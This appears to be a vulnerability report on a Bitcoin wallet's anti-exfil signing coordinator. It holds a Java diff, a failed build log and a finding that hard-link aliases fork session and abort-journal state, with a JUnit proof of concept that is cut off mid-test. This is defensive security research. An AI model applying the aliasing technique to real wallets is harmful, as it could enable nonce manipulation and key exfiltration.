     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
+            if(pendingRhos.isEmpty()) {
+                throw fail(STATE_INVALID, "Unrevealed host randomness is unavailable after coordinator restart");
+            }
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
-                byte[] rho = state.rhos.get(identifier);
+                byte[] rho = pendingRhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
             State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
-                    state.message1, encodedOpenings, message3, null, null, state.rhos);
+                    state.message1, encodedOpenings, message3, null, null, pendingRhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
+            pendingRhos.clear();
             return message3.clone();
         });
     }
 
     public Completion complete(byte[] encodedSignatures) {
         if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
             AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
             AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
             if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
             AntiExfilCodec.validateTransition(reveal, signatures);
             byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                     AntiExfilCodec.decode(state.message1), signatures, state.rhos);
             State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                     state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                 commit, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
             verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
             if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                     commit.getSessionId(), commit.getPsbtDigest(), reason.name());
         });
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
-        AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
-                commit.getNetwork(), commit.getSessionId(), state.rhos);
-        if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
-        if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
+            if(!state.rhos.isEmpty()) throw fail(STATE_INVALID, "Unrevealed host randomness must not be persisted");
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
+        AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
+                commit.getNetwork(), commit.getSessionId(), state.rhos);
+        if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
+        if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
         byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
         return bytes.toByteArray();
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
-            if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
+            if(identity.length != 32 || count > AntiExfilCodec.MAX_SLOTS
+                    || (Phase.values()[phaseCode] == Phase.COMMITMENTS_CREATED ? count != 0 : count < 1)) {
+                throw new IOException("Invalid coordinator-state header");
+            }
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
             return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
                          byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 28 lines & 0.9033203125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 2s
```

---

# File aliases fork protected signing state
**#247991**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java` (2 locations)
#### Lines 24-33 — _Lock identity is derived lexically from the supplied basename._

```
    static <T> T locked(Path target, IOAction<T> action) {
        try {
            Path absolute = target.toAbsolutePath();
            Path parent = absolute.getParent();
            if(parent == null) throw new IOException("Durable state requires a parent directory");
            Files.createDirectories(parent);
            Path lockPath = parent.resolve(absolute.getFileName() + ".lock");
            try(FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                FileLock ignored = channel.lock()) {
                return action.run();
```
⋯
#### Lines 50-80 — _Atomic replacement updates only the supplied directory entry, splitting aliases._

```
    static void write(Path path, byte[] body, boolean createOnly) throws IOException {
        if(createOnly && Files.exists(path)) throw new IOException("State already exists");
        byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
        Path absolute = path.toAbsolutePath();
        Path parent = absolute.getParent();
        Path temporary = Files.createTempFile(parent, absolute.getFileName() + ".", ".tmp");
        boolean moved = false;
        try {
            try {
                Files.setPosixFilePermissions(temporary, EnumSet.of(OWNER_READ, OWNER_WRITE));
            } catch(UnsupportedOperationException ignored) {
                // Windows uses inherited ACLs; POSIX stores are restricted explicitly.
            }
            try(FileChannel channel = FileChannel.open(temporary, StandardOpenOption.WRITE,
                    StandardOpenOption.TRUNCATE_EXISTING)) {
                ByteBuffer buffer = ByteBuffer.wrap(encoded);
                while(buffer.hasRemaining()) channel.write(buffer);
                channel.force(true);
            }
            try {
                if(createOnly) {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE);
                } else {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
                }
            } catch(AtomicMoveNotSupportedException e) {
                throw new IOException("Filesystem does not support atomic durable-state replacement", e);
            }
            moved = true;
        } finally {
            if(!moved) Files.deleteIfExists(temporary);
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
#### Lines 120-149 — _Each independently locked alias can perform a first opening and disclose the shared rho._

```
    public byte[] acceptOpenings(byte[] encodedOpenings) {
        if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                return state.message3.clone();
            }
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
            AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
            if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
            AntiExfilCodec.validateTransition(commit, openings);
            List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
            for(AntiExfilSlot slot : openings.getSlots()) {
                AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                byte[] rho = state.rhos.get(identifier);
                if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                        slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
            }
            AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                    openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
            AntiExfilCodec.validateTransition(openings, reveal);
            byte[] message3 = AntiExfilCodec.encode(reveal);
            State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                    state.message1, encodedOpenings, message3, null, null, state.rhos);
            // This durable write is the security boundary: no rho is returned before it succeeds.
            AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
            return message3.clone();
        });
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
#### Lines 35-68 — _Journal reads and appends use the same alias-sensitive locking and replacement pattern._

```
    public List<AbortEvent> getEvents() {
        return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
    }

    AbortEvent append(byte[] sessionId, byte[] psbtDigest, String reason) {
        if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort event context");
        }
        byte[] reasonBytes = reason == null ? new byte[0] : reason.strip().getBytes(StandardCharsets.UTF_8);
        if(reasonBytes.length == 0 || reasonBytes.length > MAX_REASON_BYTES) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                    "Abort reason must contain 1 to " + MAX_REASON_BYTES + " UTF-8 bytes");
        }
        return AntiExfilDurableFiles.locked(path, () -> {
            Journal journal = loadOrCreate();
            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
            AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
                    new String(reasonBytes, StandardCharsets.UTF_8));
            List<AbortEvent> updated = new ArrayList<>(journal.events);
            updated.add(event);
            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
            return event;
        });
    }

    private Journal loadOrCreate() throws IOException {
        if(!Files.exists(path)) {
            Journal journal = new Journal(walletIdentity, List.of());
            AntiExfilDurableFiles.write(path, encode(journal), true);
            return journal;
        }
        Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
        if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
        return journal;
```
## Description

Sidecar lock identity is derived from the caller-supplied target basename rather than the identity of the underlying file. A hard-link or symlink alias to one session gets a different `.lock`, so two coordinators can simultaneously read the same `COMMITMENTS_CREATED` bytes under independent locks. Each can accept a different opening, and atomic replacement splits the aliases into separate, individually valid state files while both reveal the same persisted rho. The same read-copy-replace behavior can fork an abort journal, leaving one alias with stale empty history that passes the fresh-session gate. Checksums do not expose the fork because each resulting file is internally valid.
## Root cause

Lexical sidecar names do not canonicalize filesystem aliases, while atomic pathname replacement turns aliased read-copy-write state into divergent security histories.
## Impact

A filesystem actor colluding with the signer can obtain multiple openings/reveals for one host contribution, defeating the durable retry-conflict boundary and enabling nonce manipulation or key exfiltration. Journal aliases can also hide a recorded abort and permit unacknowledged fresh sessions.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void drivesFrozenPsbtTranscriptThroughDurableCoordinator() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path session = temporary.resolve("poc.aexs");
        Path journal = temporary.resolve("poc.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertFalse(completion.isBroadcast());
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(5, completion.getVerifiedSignatures().size());
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(original, keystore).size());
    }

    @Test
    void hardLinkAliasForksSessionAndAbortJournalState() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        Keystore keystore = keystore();
        Path session = temporary.resolve("real-session.aexs");
        Path sessionAlias = temporary.resolve("alias-session.aexs");
        Path journal = temporary.resolve("real-wallet.aexj");
        Path journalAlias = temporary.resolve("alias-wallet.aexj");

        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4);
        Files.createLink(sessionAlias, session);
        assertTrue(Files.isSameFile(session, sessionAlias), "attacker-created hard link starts as the same session inode");

        AntiExfilMessage commit = AntiExfilCodec.decode(coordinator.getHostCommitMessage());
        byte[] firstOpenings = openingsFor(commit, ECKey.fromPrivate(BigInteger.valueOf(2)).getPubKey());
        byte[] changedOpenings = openingsFor(commit, ECKey.fromPrivate(BigInteger.valueOf(3)).getPubKey());
        assertFalse(Arrays.equals(firstOpenings, changedOpenings), "the colluding signer supplies two different openings");

        byte[] firstReveal = coordinator.acceptOpenings(firstOpenings);
        assertFalse(Files.isSameFile(session, sessionAlias),
                "atomic replace on one hard-link name leaves the other name pointing at the old COMMITMENTS_CREATED state");
        assertEquals(AntiExfilCoordinator.Phase.OPENINGS_ACCEPTED,
                AntiExfilCoordinator.load(session, journal, keystore).getStatus().getPhase());
        AntiExfilException normalRetryConflict = assertThrows(AntiExfilException.class,
                () -> AntiExfilCoordinator.load(session, journal, keystore).acceptOpenings(changedOpenings));
        assertEquals(AntiExfilException.Code.RETRY_CONFLICT, normalRetryConflict.getCode(),
                "without the alias fork, the real session rejects a changed opening after rho disclosure");

        AntiExfilCoordinator aliasCoordinator = AntiExfilCoordinator.load(sessionAlias, journal, keystore);
        byte[] secondReveal = aliasCoordinator.acceptOpenings(changedOpenings);
        assertEquals(AntiExfilCoordinator.Phase.OPENINGS_ACCEPTED,
                AntiExfilCoordinator.load(sessionAlias, journal, keystore).getStatus().getPhase());
        assertRhosEqualForEverySlot(firstReveal, secondReveal);
        assertFalse(Arrays.equals(firstReveal, secondReveal),
                "both accepted states are valid but bind the shared host randomness to different signer openings");

        Files.createLink(journalAlias, journal);
        assertTrue(Files.isSameFile(journal, journalAlias), "attacker-created hard link starts as the same empty journal inode");
        aliasCoordinator.recordPostRevealAbort(AntiExfilCoordinator.AbortReason.SIGNER_CANCELLED);
        assertFalse(Files.isSameFile(journal, journalAlias),
                "journal append atomically replaces only the real journal pathname and strands the hard-link alias on stale history");
        assertEquals(1, AntiExfilCoordinator.load(sessionAlias, journal, keystore).getStatus().getPostRevealAbortCount());
        assertEquals(0, new AntiExfilAbortJournal(journalAlias,
                AntiExfilCoordinator.getWalletKeyIdentity(keystore)).getEvents().size());

        Path blockedFresh = temporary.resolve("blocked-fresh.aexs");
        AntiExfilException blocked = assertThrows(AntiExfilException.class,
                () -> AntiExfilCoordinator.create(blockedFresh, journal, original, keystore, AntiExfilNetwork.TESTNET4));
        assertEquals(AntiExfilException.Code.RETRY_CONFLICT, blocked.getCode(),
                "the real journal correctly gates fresh sessions after a post-reveal abort");

        Path bypassFresh = temporary.resolve("bypass-fresh.aexs");
        AntiExfilCoordinator bypassed = AntiExfilCoordinator.create(bypassFresh, journalAlias, original, keystore,
                AntiExfilNetwork.TESTNET4);
